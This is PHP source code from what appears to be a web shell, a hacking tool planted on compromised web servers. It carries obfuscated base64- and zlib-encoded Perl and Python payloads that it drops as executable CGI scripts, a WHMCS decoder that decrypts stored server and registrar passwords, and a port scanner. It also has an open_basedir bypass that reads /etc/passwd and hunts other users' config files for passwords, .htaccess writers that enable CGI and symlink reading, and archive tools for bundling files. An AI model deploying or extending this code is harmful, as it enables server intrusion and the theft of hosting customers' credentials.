            'use MIME::Base64;use Compress::Zlib;eval(Compress::Zlib::memGunzip(decode_base64("H4sIAAAAAAAA/6UZDXfTRvKvLBthSRBbtktazrJcQuJA3iUhlxju9aJgZGlt70OWVH2QpMb97Tezu7KkEKC0yUORZud7ZmdmlyJj5PT4dDwYvPQy9vMzuwDAEQ+ZBETeignQwU1AdG+WTRMvX+q25i/4NOApcQg8EcsoFw2ta5q29l8enU1guWtrZ5ODVXDJEviiLWprbyN+W0FsgBzEq5UXBRO+YnGRHxapl/M4gtUekF8u45vDO5DB/TdFnhQ5wm0NtBKC4WvB8jBe8Ih8/ozvyU3BA0MbmvhNvXDuoYhSoKFU+5VUig1ITSlTIJ+DwXVk6gcU8GhyE1DAOAdL7/OjritQLES4YOAY5udx2sQh/VGrR3qjVl/g4ltPwIAoK2bkgnnBuZeCy9dh7HshMZ7wyAQeL6aEz+FpK7DGd4kG7/D8yO7g+ckLQe5pEeY88dL8KE5Xh17uAak2Pnu31g/enE3GZ5Pp5Lfzsb4hzp/EWpXIrjUH9HYA+DaZxUUUeOmdY3Semppl87khOVyM//N2fDmZno4nr98cAg/2O6GvxhNqrjUebQUB0sVv08vJxfHZK31jb1iYfZvF+ZtL5JGC6cbl5PD4DKzh0e49vU/GZ68mr/WNaW+27P6uTaDwSwUBtfV2W+9oPftFyDPMriwJeW5YWxRL6APOfQ0asvRlHCCVhthXvesmGDRwUzfCf5/hT2SVy0jxwdZKYr18/ZNkgkKzAJVHa30Ouw+VRnuIQKpYAHdcxrx3XIq2uLQkk/i92pdgTS1rcR+WIQy8A0nk9G1licav4ZU/fQrOKQES/33nqZAoVKwvAXfDvVFKQBYqBSATlYniDVkY742GW0zzswBo8KWZQsUt7mOj0zGtxPM/GtSnu2TJbg2tZ5rWgglDUJKwFSjsDaYXW78Q+acC1yoDBiYyz1/CBzG6pNMh2g6AMVkr49ynFgHxRm0XVZwcyQmxd0nfVEZ+V8kfNKUDZdDtUtzfRsDmPGJQvspVLKZ1TGX1BovF2ySMvQDL9dpfxomhTbwUCuAZBMsU3GoAdNhBkaYsyg95aqJ+K+vKdV3rGva4Nkm9KJuzFJmJtUfG1XvrvetePzG1R3adESqh6h/uGrWEhJf8D5TDo9yAJF1gM2hmtEksqOn9ZyYWlThhkfH2/OTN/uHR8cl4l9BRTQw1zfWMR6s4YDUkYZaspnaSgiBSrZF7wmw/jLMGsSKhpbEsIPe1//fLjhtRhahPlowgQ0L1zkz1w4aXOzolN15GChEJ4JcVvs+ybF6E4V1Hl8mppB55qBr0mkfUlvE7xwUUrQIJ9YqsNSxbWJWGPsSKpaOhAMQRUKx47tB8ybOO/OgEPPNmwNXJ04LZYiXoQIYUzJnlsWcUEct8L2EGi3zw5NuLY+i1SRwBZ6OObUKaUQJI+V3CHLotolUNpWTF8mUcOLJcE8/HHu2AY7RLP+VJfgJ9CUHgktEw9GYsJEDsUOWaFKBZ4kWEA4vpdI6uLBIAWggdkWGWp3G0GLWiWZbY8nmwjCGCxBMxAESJMbQE99GQRzgNZPldCCqDJ5LQuxtEYByYglK2ksF5/tKLFogW+8UKrO9ABMchw9eXd8eB4epbnVzd7PAoYunryemJI7yE8rOr7nVHDESUSC8hlBJRGumckgzyx6E/7dFSM7kiI1XSlF8yRkrFLYXEWfIgYFHJOdgig6urHSzc/HUq70sRIpbwR6WVLhr7FKwSTThleZFGog3jCxFpaNcTWEGqzD33Fkx2prU2FvkVVPo16439EIJoDFfvvfYf++3/ddv/ujYt/bHeKSJZMF8/obtQLC22KPftQQyaR3kbDR6QnN3m1jJfhdhQtlt2iJDRcAl6jYY5z0M2OkDBZHZH9k+O9smE7Z+SNjl4dUzOWRoOLYk0FHk0erKGCTSEEiwTabOzTYv1HPyYD0jKF8vcjj+xFAA3A+l224/DOB3s9Pfm827XvuFBvhz0nnWTW7tMTCiLyLc9g6Hto43Kt7dMCAtDnmQ8s2+WPGdt2BI+WBjFN6mX2BuR7+sVlB0etYX8AZRR4A30OYdxsO2FfBENyAqUCZk9i1MICuAktySLQx4QKHX2DLy6SHGmAd9hBYQNDt4E7Nt2tvQC1KMLv8+Aaqc7/qn7bF9xaqdewItsgEvKNtLfQwV+xAy/SDPwEUlijgn4FcdIY4nc6+u6zmiDikHI5nmpSE94YiO2wpXYCnKPXa+VwFJenZcI7sNukpEkcYoF4yEHbHb8VbD+W9xK3/2CKj8QzwekJV4Q8GjRVk7KcqjKA7L35QpDTRC+waBAaD3YyliTlH6NvK5pX1O+FFzTpW7PzpH4KQUPej8Dmkr8vef+3t7zMvG73cfVDvGKPLY3WL5xgw0tuTVnOP3GEdamb1VlcDXW4zkgZAb2qNlCSHToTlf8QGGNE+lKh8IXpkbtU74KtWrfS4ZOFwB0FjCTpkGVrJouVBMlCgJJR1dkOKtKCXiEkcwLSAvS9xPPOHRh8qcAq68XixU0/I4fr4bWbESusf5GeVV/hzl2biLd7NAeDBJSS/QeJT7sJdw/4GihJ34rxzu0D4rmyCJoECmt57DrHPqOpYEXeWVfQhJQo2HXTr8/7vefi5XLSnNysOCqNs5GSm0CtTeC8yxYn8cEmz5LIcA4BHV0iZcH+MDG0mwRR3EM9pZTkNJ7RDutB8YfY9uHOrTiCA/0FfzFrMEUwhpPa3LUDcIJJPgxFgLktdbOUxh28ERXnb9rPWlExBEc4irmEjlH6Cqfuz/9Ai61ddBze9WAKolh5cX3KGrOodWA8yVNfzZnvT2gqalV4l+7GqF2NQ2iM2Y/PA3KleW9Jej8jVWYlhxXX8JOWzdmSFeHSKu7no7u6hux6v/QhOlXE+Y/nU+3o9aPjKJ/a7ICgEweSO46A6wWJbkvp0yoUNvZr/sXZzJfpus97HI2bM6NimQ0oo3ZWD6/S7+USkZiBg65/9GhEHw/juYcdpur76eM3MUFnFvg5VdIAJUBQCQSQk6ARA2Fcw8+7K1Or2M4p1WDJWToPxoqm9eAa+D0SG5cc+2FHqjbNatJUKASduszhiV55d3yVbEiORCTGM6IX7lTzBjYHhiZWZ7BxrfML3JWMlxvWtsrOPteOm1vuC4PLo7PJ9Oz/dMxHDNru73CGF+8G19sMZqna1Jex9iaTN0ShIdW7aKISmUcEjDcFtOZuJyVp2kfr8C0xqD9AFaAWPJSoIH6QV1ufsCTdGMN40XFwbyhAl4TvHezJ37gZk/xxgkvz2CwgBOivO75LoF9n0LGv3lFqi5oOzWovdHehMEDR4nKPdQPiFuv6S6F6qtY4aKSWwGV+V9xjWT8wbQ3rXsnHLy/wXvfv9RRth3DfVFPjhqmLO73WuIw4J/KBqGGQ5xmBn0cx/SRGD+k5YOHuomaMUUDqgKybUCySYOI0TD5tqjGYFoKL4dKksY3maP3uzrJEphJ/CWDoqKLygCiRTqorMaMUqdPc92qLqvKBPiLcawbU0+Pen3QLo9frfX9k4tTcQ3qtprb35b14ytFQd0of/EfDcD2s9Or8g3v6chnaouLKwWUmLvbemPi0SdkxrCxPgJWU3XgxRvQ1I1MvE1VCaBN8QC7AWndRnGsMlJo+GU13GzKFLLK+JQxtpLaSEbt1lfHJLt1b1Kz/w8wblS+FRoAAA==")));';
        $py =
            "#!/usr/bin/python" .
            "\nimport zlib, base64\n" .
            'eval(compile(zlib.decompress(base64.b64decode("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")),\'<string>\',\'exec\'))';
        if ($_POST["riot1"] == "perl") {
            $code = $perl;
        } else {
            $code = $py;
        }
        if (__write_file($name, $code)) {
            @chmod($name, 0755);
            echo '<iframe src="' . __SYS_CONFIG_FOLDER__ . "/cgiriot/" . $name . '" width="100%" height="600px" frameborder="0" style="opacity:0.9;filter: alpha(opacity=9);overflow:auto;"></iframe>';
        }
    }
    echo $div;
    riotfooter();
}
function riotWhmcs()
{
    riothead();
    echo "<div class=header>";
    function decrypt($string, $cc_encryption_hash)
    {
        $key = md5(md5($cc_encryption_hash)) . md5($cc_encryption_hash);
        $hash_key = _hash($key);
        $hash_length = strlen($hash_key);
        $string = __ZGVjb2Rlcg($string);
        $tmp_iv = substr($string, 0, $hash_length);
        $string = substr($string, $hash_length, strlen($string) - $hash_length);
        $iv = $out = "";
        $c = 0;
        while ($c < $hash_length) {
            $iv .= chr(ord($tmp_iv[$c]) ^ ord($hash_key[$c]));
            ++$c;
        }
        $key = $iv;
        $c = 0;
        while ($c < strlen($string)) {
            if ($c != 0 and $c % $hash_length == 0) {
                $key = _hash($key . substr($out, $c - $hash_length, $hash_length));
            }
            $out .= chr(ord($key[$c % $hash_length]) ^ ord($string[$c]));
            ++$c;
        }
        return $out;
    }
    function _hash($string)
    {
        if (function_exists("sha1")) {
            $hash = sha1($string);
        } else {
            $hash = md5($string);
        }
        $out = "";
        $c = 0;
        while ($c < strlen($hash)) {
            $out .= chr(hexdec($hash[$c] . $hash[$c + 1]));
            $c += 2;
        }
        return $out;
    }
    AlfaNum(8, 9, 10);
    echo "<center><br><div class='txtfont_header'>| WHMCS DeCoder |</div><p>" .
        getConfigHtml("whmcs") .
        "</p><form onsubmit=\"g('Whmcs',null,this.form_action.value,'decoder',this.db_username.value,this.db_password.value,this.db_name.value,this.cc_encryption_hash.value,this.db_host.value); return false;\">
<input type='hidden' name='form_action' value='2'>";
    $table = [
        "td1" => [
            "color" => "FFFFFF",
            "tdName" => "db_host : ",
            "inputName" => "db_host",
            "id" => "db_host",
            "inputValue" => "localhost",
            "inputSize" => "50",
        ],
        "td2" => [
            "color" => "FFFFFF",
            "tdName" => "db_username : ",
            "inputName" => "db_username",
            "id" => "db_user",
            "inputValue" => "",
            "inputSize" => "50",
        ],
        "td3" => [
            "color" => "FFFFFF",
            "tdName" => "db_password : ",
            "inputName" => "db_password",
            "id" => "db_pw",
            "inputValue" => "",
            "inputSize" => "50",
        ],
        "td4" => [
            "color" => "FFFFFF",
            "tdName" => "db_name : ",
            "inputName" => "db_name",
            "id" => "db_name",
            "inputValue" => "",
            "inputSize" => "50",
        ],
        "td5" => [
            "color" => "FFFFFF",
            "tdName" => "cc_encryption_hash : ",
            "inputName" => "cc_encryption_hash",
            "id" => "cc_encryption_hash",
            "inputValue" => "",
            "inputSize" => "50",
        ],
    ];
    create_table($table);
    echo "<p><input type='submit' value=' ' name='Submit'></p></form></center>";
    if ($_POST["riot5"] != "") {
        $db_host = $_POST["riot7"];
        $db_username = $_POST["riot3"];
        $db_password = $_POST["riot4"];
        $db_name = $_POST["riot5"];
        $cc_encryption_hash = $_POST["riot6"];
        echo __pre();
        ($conn = @mysqli_connect($db_host, $db_username, $db_password, $db_name)) or die(mysqli_error($conn));
        $query = mysqli_query($conn, "SELECT * FROM tblservers");
        $num = mysqli_num_rows($query);
        if ($num > 0) {
            for ($i = 0; $i <= $num - 1; $i++) {
                $v = @mysqli_fetch_array($query);
                $ipaddress = $v["ipaddress"];
                $username = $v["username"];
                $type = $v["type"];
                $active = $v["active"];
                $hostname = $v["hostname"];
                echo "<center><table border='1'>";
                $password = decrypt($v["password"], $cc_encryption_hash);
                echo "<tr><td><b><font color=\"#FFFFFF\">Type</font></td><td>$type</td></tr></b>";
                echo "<tr><td><b><font color=\"#FFFFFF\">Active</font></td><td>$active</td></tr></b>";
                echo "<tr><td><b><font color=\"#FFFFFF\">Hostname</font></td><td>$hostname</td></tr></b>";
                echo "<tr><td><b><font color=\"#FFFFFF\">Ip</font></td><td>$ipaddress</td></tr></b>";
                echo "<tr><td><b><font color=\"#FFFFFF\">Username</font></td><td>$username</td></tr></b>";
                echo "<tr><td><b><font color=\"#FFFFFF\">Password</font></td><td>$password</td></tr></b>";
                echo "</table><br><br></center>";
            }
            $query1 = @mysqli_query($conn, "SELECT * FROM tblregistrars");
            $num1 = @mysqli_num_rows($query1);
            if ($num1 > 0) {
                for ($i = 0; $i <= $num1 - 1; $i++) {
                    $v = mysqli_fetch_array($query1);
                    $registrar = $v["registrar"];
                    $setting = $v["setting"];
                    $value = decrypt($v["value"], $cc_encryption_hash);
                    if ($value == "") {
                        $value = 0;
                    }
                    echo "<center>Domain Reseller <br><center>";
                    echo "<center><table border='1'>";
                    echo "<tr><td><b><font color=\"#00C3FF\">Register</font></td><td>$registrar</td></tr></b>";
                    echo "<tr><td><b><font color=\"#00C3FF\">Setting</font></td><td>$setting</td></tr></b>";
                    echo "<tr><td><b><font color=\"#00C3FF\">Value</font></td><td>$value</td></tr></b>";
                    echo "</table><br><br></center>";
                }
            }
        } else {
            __alert('<font color="red">tblservers is Empty...!</font>');
        }
    }
    echo "</div>";
    riotfooter();
}
function riotportscanner()
{
    riothead();
    echo '<div class=header><center><p><div class="txtfont_header">| Port Scaner |</div></p>
<form action="" method="post" onsubmit="g(\'portscanner\',null,null,this.start.value,this.end.value,this.host.value); return false;">
<input type="hidden" name="y" value="phptools">
<div class="txtfont">Host: </div> <input id="text" type="text" name="host" value="localhost"/>
<div class="txtfont">Port start: </div> <input id="text" size="5" type="text"  name="start" value="80"/>
<div class="txtfont">Port end: </div> <input id="text" size="5" type="text" name="end" value="80"/> <input type="submit" value=" " />
</form></center><br>';
    $start = strip_tags($_POST["riot2"]);
    $end = strip_tags($_POST["riot3"]);
    $host = strip_tags($_POST["riot4"]);
    if (isset($_POST["riot4"]) && is_numeric($_POST["riot3"]) && is_numeric($_POST["riot2"])) {
        echo __pre();
        $packetContent = "GET / HTTP/1.1\r\n\r\n";
        if (ctype_xdigit($packetContent)) {
            $packetContent = @pack("H*", $packetContent);
        } else {
            $packetContent = str_replace(["\r", "\n"], "", $packetContent);
            $packetContent = str_replace(["\\r", "\\n"], ["\r", "\n"], $packetContent);
        }
        for ($i = $start; $i <= $end; $i++) {
            $sock = @fsockopen($host, $i, $errno, $errstr, 3);
            if ($sock) {
                stream_set_timeout($sock, 5);
                fwrite($sock, $packetContent . "\r\n\r\n\x00");
                $counter = 0;
                $maxtry = 1;
                $bin = "";
                do {
                    $line = fgets($sock, 1024);
                    if (trim($line) == "") {
                        $counter++;
                    }
                    $bin .= $line;
                } while ($counter < $maxtry);
                fclose($sock);
                echo "<center><p>Port <font style='color:#DE3E3E'>$i</font> is open</p>";
                echo "<p><textarea style='height:140px;width:50%;'>" . $bin . "</textarea></p></center>";
            }
            flush();
        }
    }
    echo "</div>";
    riotfooter();
}
function riotcgihtaccess($m, $d = "", $symname = false)
{
    $readme = "";
    if ($symname) {
        $readme = "\nReadmeName " . trim($symname);
    }
    if ($m == "cgi") {
        $code = "#Coded By IDM\nOptions FollowSymLinks MultiViews Indexes ExecCGI\nAddType application/x-httpd-cgi .riot\nAddHandler cgi-script .riot";
    } elseif ($m == "sym") {
        $code = "#Coded By IDM\nOptions Indexes FollowSymLinks\nDirectoryIndex riotexec.phtm\nAddType text/plain php html php4 phtml\nAddHandler text/plain php html php4 phtml{$readme}\nOptions all";
    } elseif ($m == "shtml") {
        $code = "Options +Includes\nAddType text/html .shtml\nAddHandler server-parsed .shtml";
    }
    @__write_file($d . ".htaccess", $code);
}
function riotbasedir()
{
    riothead();
    echo '<div class=header>
<center><p><div class="txtfont_header">| Open Base Dir |</div></p></center>';
    $passwd = _riot_file("/etc/passwd");
    if (is_array($passwd)) {
        $users = [];
        $makepwd = riotMakePwd();
        $basedir = @ini_get("open_basedir");
        $safe_mode = @ini_get("safe_mode");
        if (_riot_can_runCommand(true, false) && ($basedir || $safe_mode)) {
            $bash =
                "fZBPSwMxEMXPzacYx9jugkvY9lbpTQ9eFU9NWdYk2wYkWZKsgmu+u9NaS8E/cwgDL/N+M+/yQjxbJ+KO3d4/rHjNusGpZL2DmEITTP/SKlOUIwOqNVTvgLxG2MB0CsGkITioz7X5P9riN60hzhHTvLYn5IoXfbAudYBXUUqHX9wPiEZDZQCj4OM807PIYovlwevHxPiHe0aWmVE7f7BaS4Ws8wEsWAe8UEOCSi+h6moQJinRtzG+6fIGtGeTp8c7Cqo4i4dAFB7xxiGakPdgSxtN6OxA/X7gePk3UtIPiddMe2dOe8wQN7NP";
            $tmp_path = riotWriteTocgiapi("basedir.riot", $bash);
            $bash_users = riotEx("cd " . $tmp_path . "/riotcgiapi;sh basedir.riot " . $makepwd, false, true, true);
            $users = json_decode($bash_users, true);
            $x = count($users);
            if ($x >= 2) {
                array_pop($users);
                --$x;
            }
        }
        if (!$basedir && !$safe_mode) {
            $x = 0;
            foreach ($passwd as $str) {
                $pos = strpos($str, ":");
                $username = substr($str, 0, $pos);
                $dirz = str_replace("{user}", $username, $makepwd);
                if ($username != "") {
                    if (@is_readable($dirz)) {
                        array_push($users, $username);
                        $x++;
                    }
                }
            }
        }
        echo "<br><br>";
        echo "<b><font color=\"#00A220\">[+] Founded " . sizeof($passwd) . " entrys in /etc/passwd\n" . "<br /></font></b>";
        echo "<b><font color=\"#FFFFFF\">[+] Founded " . $x . " readable " . str_replace("{user}", "*", $makepwd) . " directories\n" . "<br /></font></b>";
        echo "<b><font color=\"#4c1eba\">[~] Searching for passwords in config files...\n\n" . "<br /><br /><br /></font></b>";
        foreach ($users as $user) {
            if (empty($user)) {
                continue;
            }
            $path = str_replace("{user}", $user, $makepwd);
            echo "<form method=post onsubmit='g(\"FilesMan\",this.c.value,\"\");return false;'><span><font color=#B501F7>Change Dir <font color=#FFFF01>..:: </font><font color=red><b>$user</b></font><font color=#FFFF01> ::..</font></font></span><br><input class='foottable' type=text name=c value='$path'><input type=submit value='>>'></form><br>";
        }
    } else {
        echo '<b> <center><font color="#FFFFFF">[-] Error : coudn`t read /etc/passwd [-]</font></center></b>';
    }
    echo "<br><br></b>";
    echo "</div>";
    riotfooter();
}
function riotziper()
{
    riothead();
    AlfaNum(8, 9, 10);
    echo '<div class=header><p><center><p><div class="txtfont_header">| Compressor |</div></p>
<form onSubmit="g(\'ziper\',null,null,null,this.dirzip.value,this.zipfile.value,\'>>\');return false;" method="post">
<div class="txtfont">Dir/File: </div> <input type="text" name="dirzip" value="' .
        (!empty($_POST["riot3"]) ? htmlspecialchars($_POST["riot3"]) : htmlspecialchars($GLOBALS["cwd"])) .
        '" size="60"/>
<div class="txtfont">Save Dir: </div> <input type="text" name="zipfile" value="' .
        $GLOBALS["cwd"] .
        'riot.zip" size="60"/>
<input type="submit" value=" " name="ziper" />
</form></center></p>';
    if (isset($_POST["riot5"]) && $_POST["riot5"] == ">>") {
        $dirzip = $_POST["riot3"];
        $zipfile = $_POST["riot4"];
        if ($GLOBALS["sys"] != "unix" && _riot_can_runCommand(true, true)) {
            riotEx("powershell Compress-Archive -Path '" . addslashes($dirzip) . "' -DestinationPath '" . addslashes(basename($zipfile)) . "'");
            echo __pre() . '<center><p>Done -> <b><font color="red">' . $zipfile . "</font></b></p></center>";
        } elseif ($GLOBALS["sys"] == "unix" && _riot_can_runCommand(true, true)) {
            riotEx("cd '" . addslashes(dirname($zipfile)) . "';zip -r '" . addslashes(basename($zipfile)) . "' '" . addslashes($dirzip) . "'");
            echo __pre() . '<center><p>Done -> <b><font color="red">' . $zipfile . "</font></b></p></center>";
        } elseif (class_exists("ZipArchive")) {
            if (__riotziper($dirzip, $zipfile)) {
                echo __pre() . '<center><p><font color="red">Success...!<br>' . $zipfile . "</font></p></center>";
            } else {
                echo __pre() . '<center><p><font color="red">ERROR!!!...</font></p></center>';
            }
        }
    }
    echo "</div>";
    riotfooter();
}
function __riotziper($source, $destination)
{
    if (!extension_loaded("zip") || !file_exists($source)) {
        return false;
    }
    $zip = new ZipArchive();
    if (!$zip->open($destination, ZIPARCHIVE::CREATE)) {
        return false;
    }
    $source = str_replace("\\", "/", realpath($source));
    if (is_dir($source) === true) {
        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), RecursiveIteratorIterator::SELF_FIRST);
        foreach ($files as $file) {
            $file = str_replace("\\", "/", $file);
            if (in_array(substr($file, strrpos($file, "/") + 1), [".", ".."])) {
                continue;
            }
            $file = realpath($file);
            if (is_dir($file) === true) {
                $zip->addEmptyDir(str_replace($source . "/", "", $file . "/"));
            } elseif (is_file($file) === true) {
                $zip->addFromString(str_replace($source . "/", "", $file), file_get_contents($file));
            }
        }
    } elseif (is_file($source) === true) {
        $zip->addFromString(basename($source), file_get_contents($source));
    }
    return $zip->close();
}
function riotdeziper()
{
    riothead();
    AlfaNum(8, 9, 10);
    echo '<div class=header><p><center><p><div class="txtfont_header">| DeCompressor |</div></p>
<form onSubmit="g(\'deziper\',null,null,null,this.dirzip.value,this.zipfile.value,\'>>\');return false;" method="post">
<div class="txtfont">File: </div> <input type="text" name="dirzip" value="' .
        (!empty($_POST["riot3"]) ? htmlspecialchars($_POST["riot3"]) : htmlspecialchars($GLOBALS["cwd"])) .
        '" size="60"/>
<div class="txtfont">Extract To: </div> <input type="text" name="zipfile" value="' .
        $GLOBALS["cwd"] .
        '" size="60"/>
<input type="submit" value=" " name="ziper" />
</form></center></p>';
    if (isset($_POST["riot5"]) && $_POST["riot5"] == ">>") {
        $dirzip = $_POST["riot3"];
        $zipfile = $_POST["riot4"];
        if (@!is_dir($zipfile)) {
            @mkdir($zipfile, 0777, true);
        }
        $finfo = "";
        $file_type = "";
        if (function_exists("finfo_open")) {
            $finfo = @finfo_open(FILEINFO_MIME_TYPE);
            $file_type = @finfo_file($finfo, $dirzip);
            @finfo_close($finfo);
        } else {
            if ($GLOBALS["sys"] == "unix" && _riot_can_runCommand(true, true)) {
                $file_type = riotEx("file -b --mime-type " . $dirzip);
            }
        }
        if ($GLOBALS["sys"] != "unix" && _riot_can_runCommand(true, true)) {
            riotEx("powershell expand-archive -path '" . addslashes($dirzip) . "' -destinationpath '" . addslashes(basename($zipfile)) . "'");
            echo __pre() . '<center><p>Done -> <b><font color="red">' . $zipfile . "</font></b></p></center>";
        } elseif ($GLOBALS["sys"] == "unix" && !empty($file_type) && _riot_can_runCommand(true, true) && (strlen(riotEx("which unzip")) > 0 || strlen(riotEx("which tar")) > 0 || strlen(riotEx("which gunzip")) > 0)) {
            switch ($file_type) {
                case "application/zip":
                    riotEx("cd '" . addslashes($zipfile) . "';unzip '" . addslashes($dirzip) . "'");
                    break;
                case "application/x-tar":
                case "application/x-gzip":
                case "application/x-gtar":
                    if (strstr(basename($dirzip), ".tar.gz") || strstr(basename($dirzip), ".tar")) {
                        riotEx("cd '" . addslashes($zipfile) . "';tar xzf '" . addslashes($dirzip) . "'");
                    } else {
                        riotEx("cd '" . addslashes($zipfile) . "';gunzip '" . addslashes($dirzip) . "'");
                    }
                    break;
            }
            echo __pre() . '<center><p>Done -> <b><font color="red">' . $zipfile . '</font> <a style="cursor:pointer;" onclick="g(\'FilesMan\',\'' . $zipfile . '\');">[ View Folder ]</a></b></p></center>';
        } elseif (class_exists("ZipArchive")) {
            $itsok = false;
            if (emtpy($file_type)) {
                $file_type = "application/zip";
            }
            switch ($file_type) {
                case "application/zip":
                    $zip = new ZipArchive();
                    $res = $zip->open($dirzip);
                    if ($res) {
                        $zip->extractTo($zipfile);
                        $zip->close();
                        $itsok = true;
                    }
                    break;
                case "application/x-tar":
                case "application/x-gzip":
                case "application/x-gtar":
                    if (strstr(basename($dirzip), ".tar.gz")) {
                        $new_file = $zipfile . "/" . basename($dirzip);
                        @copy($dirzip, $new_file);
                        $new_tar = str_replace(".tar.gz", ".tar", $new_file);
                        try {
                            $p = new PharData($new_file);
                            $p->decompress();
                            $phar = new PharData($new_tar);
                            $phar->extractTo($zipfile);
                            @unlink($new_file);
                            @unlink($new_tar);
                            $itsok = true;
                        } catch (Exception $e) {
                        }
                    } else {
                        try {
                            $phar = new PharData($dirzip);
                            $phar->extractTo($zipfile);
                            $itsok = true;
                        } catch (Exception $e) {
                        }
                    }
                    break;
            }
            if ($itsok) {
                echo __pre() . '<center><p><font color="red">Success...!<br>' . $zipfile . '</font> <a style="cursor:pointer;" onclick="g(\'FilesMan\',\'' . $zipfile . '\');">[ View Folder ]</a></p></center>';
            } else {
                echo __pre() . '<center><p><font color="red">ERROR!!!...</font></p></center>';
            }
        }
    }
    echo "</div>";
    riotfooter();
}
function Alfa_StrSearcher($dir, $string, $ext, $e, $arr = [])
{
    if (@is_dir($dir)) {
        $files = @scandir($dir);
        foreach ($files as $key => $value) {
            $path = @realpath($dir . DIRECTORY_SEPARATOR . $value);
            if (!@is_dir($path)) {
                if ($ext != "*") {
                    $f = basename($path);
                    $f = explode(".", $f);
                    $f = end($f);
                    if ($f != $ext) {
                        continue;
                    }
                }
                if ($e == "str") {
                    $content = @file_get_contents($path);
                    if (strpos($content, $string) !== false) {
                        echo str_replace("\\", "/", $path) . "<br>";
                    }
                } else {
                    if (strstr($value, $string)) {
                        echo str_replace("\\", "/", $path) . "<br>";
                    }
                }
                $results[] = $path;
            } elseif ($value != "." && $value != "..") {
                Alfa_StrSearcher($path, $string, $ext, $e, $results);
                $results[] = $path;
            }
